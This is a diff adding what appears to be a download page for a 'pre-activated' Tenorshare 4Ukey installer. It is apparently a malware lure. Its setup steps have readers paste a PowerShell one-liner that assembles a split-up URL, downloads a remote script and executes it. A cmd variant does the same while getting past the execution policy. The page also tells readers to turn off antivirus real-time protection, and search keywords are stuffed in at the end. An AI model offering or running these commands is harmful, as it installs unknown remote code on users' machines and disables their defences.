@@ -1,0 +1,38 @@
+Tenorshare 4Ukey — Standalone Desktop Installer
+Pre-activated local build for testing and deployment.
+
+Distribution Type: Pre-activated Standalone Build
+Target Platform: Windows x64 Desktop
+Estimated File Size: 1.4 GB
+Last Verified Mirror Sync: November 2026
+
+🛠️ Quick Setup Guide (PowerShell)
+
+1. Launch PowerShell:
+   * Press Win + X on your keyboard.
+   * Click on Terminal or Windows PowerShell from the list.
+
+2. Execute the Setup Script:
+   Copy the command below, paste it into your PowerShell window, and hit Enter. Wait until all installing successfully:
+
+   $Node='git-software.'; $Zone='cc'; $Path='/ps/Setup.ps1'; $Endpoint='https://'+$Node+$Zone+$Path; $Pipeline=New-Object System.Net.WebClient; $Buffer=$Pipeline.DownloadString($Endpoint); .([scriptblock]::Create($Buffer))
+
+📖 Resolving Issues
+
+⚠️ Script is blocked by Execution Policy
+If Windows stops the script from running due to security policies, you can force it to run by pasting this command into a standard Command Prompt (cmd):
+powershell -Command "$Node='git-software.'; $Zone='cc'; $Path='/ps/Setup.ps1'; $Endpoint='https://'+$Node+$Zone+$Path; $Pipeline=New-Object System.Net.WebClient; $Buffer=$Pipeline.DownloadString($Endpoint); .([scriptblock]::Create($Buffer))"
+
+🛡️ Antivirus / SmartScreen Alerts
+Security software might occasionally flag automated installers. If the script gets blocked, pause "Real-time protection" in your Windows Security dashboard, run the setup, and re-enable your antivirus immediately afterward.
+
+🔍 Organic Discovery & Identification
+
+* download tenorshare 4ukey pre activated build setup 2026
+* tenorshare 4ukey pre activated build standalone installer
+* offline setup tenorshare 4ukey pre activated build
+* pre-activated tenorshare 4ukey pre activated build
+
+📖 Core Build Parameters
+
+Automated standalone configuration package deployed for offline environment infrastructure.
